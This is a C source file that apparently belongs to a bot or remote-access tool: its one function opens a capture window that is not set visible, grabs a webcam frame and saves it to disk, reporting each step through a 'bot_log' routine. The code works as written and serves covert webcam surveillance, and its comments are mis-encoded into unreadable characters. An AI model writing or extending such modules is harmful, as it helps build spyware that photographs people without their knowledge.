#include "header.h"
#include <vfw.h>
#include <windows.h>

#pragma comment(lib, "vfw32.lib")

int take_webcam_photo(char* out_path, int path_len) {
    HWND hWndCap = NULL;

    // ��������ͷ���񴰿ڣ�W �汾��
    bot_log("[+] Creating capture window...\n");
    hWndCap = capCreateCaptureWindowW(L"Webcam", WS_POPUP, 0, 0, 640, 480, NULL, 0);
    if (!hWndCap) {
        bot_log("[!] Failed to create capture window\n");
        goto fail;
    }

    // ��������ͷ�豸
    bot_log("[+] Connecting to webcam device...\n");
    if (!SendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, 0, 0)) {
        bot_log("[!] Failed to connect to webcam\n");
        goto fail;
    }

    // ����Ԥ��
    bot_log("[+] Starting preview...\n");
    SendMessage(hWndCap, WM_CAP_SET_PREVIEWRATE, 30, 0); // ����֡��
    SendMessage(hWndCap, WM_CAP_SET_PREVIEW, TRUE, 0);   // ����Ԥ��

    Sleep(2000); // �ȴ�����ͷ�ȶ�

    // ץȡ֡
    bot_log("[+] Grabbing frame...\n");
    if (!SendMessage(hWndCap, WM_CAP_GRAB_FRAME, 0, 0)) {
        bot_log("[!] Failed to grab frame\n");
        goto fail;
    }

    // �̶�����·��
    wchar_t tempFileW[MAX_PATH];
    wcscpy_s(tempFileW, MAX_PATH, L"C:\\Users\\hacker\\Desktop\\camshot.bmp");

    // ɾ�����ļ�����ֹ��ͻ��
    DeleteFileW(tempFileW);

    // ����Ϊ BMP �ļ�
    bot_log("[+] Saving frame to %ls ...\n", tempFileW);
    if (!SendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)tempFileW)) {
        bot_log("[!] Failed to save frame directly to file\n");
        goto fail;
    }

    // �����ַ�·��תΪ ANSI��ʹ�����ṩ�ĺ�����
    bot_log("[+] Converting Unicode path to ANSI...\n");
    if (UnicodeToAnsi(tempFileW, out_path, path_len) != 0) {
        bot_log("[!] Failed to convert Unicode to Ansi\n");
        goto fail;
    }

    bot_log("[+] Webcam photo saved: %s\n", out_path);

    // ������Դ
    SendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    DestroyWindow(hWndCap);

    return 0;

fail:
    if (hWndCap) {
        SendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
        DestroyWindow(hWndCap);
    }
    return -1;
}